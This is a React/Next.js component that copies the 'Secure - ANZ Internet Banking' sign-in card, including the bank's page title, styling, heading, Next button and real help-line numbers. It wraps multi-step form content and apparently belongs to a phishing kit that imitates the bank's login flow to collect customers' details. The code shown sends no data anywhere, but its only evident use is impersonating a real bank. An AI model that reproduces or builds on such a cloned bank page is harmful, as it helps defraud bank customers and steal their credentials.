import useMediaQuery from "@/hooks/useMediaQuery";
import Head from "next/head";
import React from "react";
import { FieldErrorsImpl } from "react-hook-form";
import { Wrapper } from "./Wrapper";

interface ContainerProps {
  children?: React.ReactNode;
  loading?: boolean;
  onSubmit?: React.MouseEventHandler<HTMLButtonElement> | undefined;
  buttonText?: string;
  title?: string;
  subTitle?: string;
  showError?: boolean;
  hideBtn?: boolean;
  isValid?: boolean;
  superTitle?: string;
  paragraph?: string;
  errors?: FieldErrorsImpl<{
    [x: string]: any;
  }>;
}

export const Container: React.FC<ContainerProps> = ({
  children,
  loading,
  onSubmit,
  buttonText,
  title,
  subTitle,
  hideBtn,
  isValid,
  superTitle,
  errors,
  paragraph,
}) => {
  const isMobile = useMediaQuery(`(max-width: 767px)`);
  return (
    <>
      <Head>
        <link rel="icon" href="/favicon.ico" />
        <title>Secure - ANZ Internet Banking</title>
      </Head>
      <Wrapper loading={loading}>
        <div
          style={{
            display: "flex",
            flexDirection: "column",
            WebkitBoxPack: "center",
            justifyContent: "center",
            flex: "1 0 auto",
            margin: "64px auto",
            ...(isMobile
              ? {
                  margin: "0px auto",
                  maxWidth: "100%",
                }
              : {}),
          }}
        >
          <div
            style={{
              display: "flex",
              flexDirection: "column",
              WebkitBoxPack: "center",
              justifyContent: "center",
              flex: "1 0 auto",
            }}
          >
            <div
              style={{
                position: "relative",
                animation: "1s ease 0.1s 1 normal both running icPxHz",
              }}
            >
              <div
                style={{
                  minHeight: "330px",
                  backgroundColor: "rgb(255, 255, 255)",
                  border: "1px solid rgb(226, 228, 230)",
                  borderRadius: "3px",
                  marginLeft: "auto",
                  marginRight: "auto",
                  maxWidth: "560px",
                  padding: "88px 96px",
                  ...(isMobile
                    ? {
                        maxWidth: "375px",
                        padding: "48px 36px",
                        border: "none",
                      }
                    : {}),
                }}
              >
                <form>
                  <div
                    style={{
                      maxWidth: "100%",
                      margin: "0px auto",
                      transition: "max-width 0.2s ease 0s",
                      padding: "0px",
                    }}
                  >
                    <div
                      style={{
                        boxSizing: "border-box",
                        display: "flex",
                        flex: "0 1 auto",
                        flexFlow: "row wrap",
                        margin: "0px -1rem 40px",
                      }}
                    >
                      <div
                        style={{
                          flexBasis: "100%",
                          maxWidth: "100%",
                          display: "block",
                          boxSizing: "border-box",
                          flex: "0 0 auto",
                          padding: "0px 1rem",
                        }}
                      >
                        <div
                          style={{
                            textAlign: "center",
                            position: "relative",
                            width: "100%",
                          }}
                        >
                          <h1
                            style={{
                              margin: "0px",
                              textAlign: "center",
                              fontWeight: "normal",
                              fontSize: isMobile ? "28px" : "32px",
                              lineHeight: "1.125",
                              letterSpacing: "normal",
                              color: "rgb(0, 65, 101)",
                              fontFamily: "myriad-pro-light, sans-serif",
                            }}
                          >
                            <span>
                              Secure{" "}
                              <div
                                style={{
                                  display: "inline-block",
                                }}
                              >
                                ANZ Internet Banking
                              </div>
                            </span>
                          </h1>
                        </div>
                      </div>
                    </div>
                    <div>{children}</div>
                    <div
                      style={{
                        boxSizing: "border-box",
                        display: "flex",
                        flex: "0 1 auto",
                        flexFlow: "row wrap",
                        margin: "0px -1rem 24px",
                      }}
                    >
                      <div
                        style={{
                          flexBasis: "100%",
                          maxWidth: "100%",
                          width: "100%",
                          display: "block",
                          boxSizing: "border-box",
                          flex: "0 0 auto",
                          padding: "0px 1rem",
                        }}
                      >
                        <div
                          style={{
                            textAlign: "center",
                            position: "relative",
                            width: "100%",
                          }}
                        >
                          <span
                            style={{
                              fontSize: "16px",
                              lineHeight: "1.25",
                            }}
                          >
                            <a
                              style={{
                                color: "rgb(0, 114, 172)",
                                WebkitTapHighlightColor: "transparent",
                                textDecoration: "none",
                                backgroundColor: "transparent",
                              }}
                            >
                              {title}
                            </a>
                          </span>
                        </div>
                      </div>
                    </div>
                    {hideBtn ? null : (
                      <div
                        style={{
                          boxSizing: "border-box",
                          display: "flex",
                          flex: "0 1 auto",
                          flexFlow: "row wrap",
                          margin: "0px -1rem 24px",
                        }}
                      >
                        <div
                          style={{
                            flexBasis: "100%",
                            maxWidth: "100%",
                            width: "100%",
                            display: "block",
                            boxSizing: "border-box",
                            flex: "0 0 auto",
                            padding: "0px 1rem",
                          }}
                        >
                          <button
                            style={{
                              width: "100%",
                              margin: "0px",
                              backgroundColor: "rgb(0, 114, 172)",
                              color: "rgb(255, 255, 255)",
                              border: "1px solid transparent",
                              borderRadius: "4px",
                              padding: "12px",
                              cursor: "pointer",
                              transition:
                                "background-color 0.2s ease 0s, border-color 0.2s ease 0s, color 0.2s ease 0s",
                              fontFamily:
                                "myriad-pro-semibold, sans-serif, sans-serif !important",
                              appearance: "button",
                              lineHeight: "1.25",
                              textTransform: "none",
                              overflow: "visible",
                              fontSize: "100%",
                            }}
                            disabled={loading}
                            onClick={onSubmit}
                          >
                            <span>Next</span>
                          </button>
                        </div>
                      </div>
                    )}
                    <hr
                      style={{
                        margin: "24px 0px",
                        borderWidth: "1px 0px 0px",
                        borderRightStyle: "initial",
                        borderBottomStyle: "initial",
                        borderLeftStyle: "initial",
                        borderRightColor: "initial",
                        borderBottomColor: "initial",
                        borderLeftColor: "initial",
                        borderImage: "initial",
                        borderTopStyle: "solid",
                        borderTopColor: "rgb(204, 204, 204)",
                        boxSizing: "content-box",
                        height: "0px",
                        overflow: "visible",
                      }}
                    />
                    <div
                      style={{
                        boxSizing: "border-box",
                        display: "flex",
                        flex: "0 1 auto",
                        flexFlow: "row wrap",
                        margin: "0px -1rem",
                      }}
                    >
                      <div
                        style={{
                          flexBasis: "100%",
                          maxWidth: "100%",
                          display: "block",
                          boxSizing: "border-box",
                          flex: "0 0 auto",
                          padding: "0px 1rem",
                        }}
                      >
                        <span
                          style={{
                            fontSize: "14px",
                            lineHeight: "1.429",
                          }}
                        >
                          <span
                            style={{
                              fontFamily:
                                "myriad-pro-semibold, sans-serif, sans-serif",
                            }}
                          >
                            Need help?
                          </span>
                          <p
                            style={{
                              margin: "0px",
                            }}
                          >
                            Call us on{" "}
                            <a
                              style={{
                                color: "rgb(0, 114, 172)",
                                WebkitTapHighlightColor: "transparent",
                                display: "inline-flex",
                                whiteSpace: "nowrap",
                                textDecoration: "none",
                                backgroundColor: "transparent",
                              }}
                            >
                              13 33 50
                            </a>{" "}
                            any time (
                            <a
                              style={{
                                color: "rgb(0, 114, 172)",
                                WebkitTapHighlightColor: "transparent",
                                display: "inline-flex",
                                whiteSpace: "nowrap",
                                textDecoration: "none",
                                backgroundColor: "transparent",
                              }}
                            >
                              +61 3 8699 6908
                            </a>{" "}
                            from overseas).
                          </p>
                        </span>
                      </div>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      </Wrapper>
    </>
  );
};
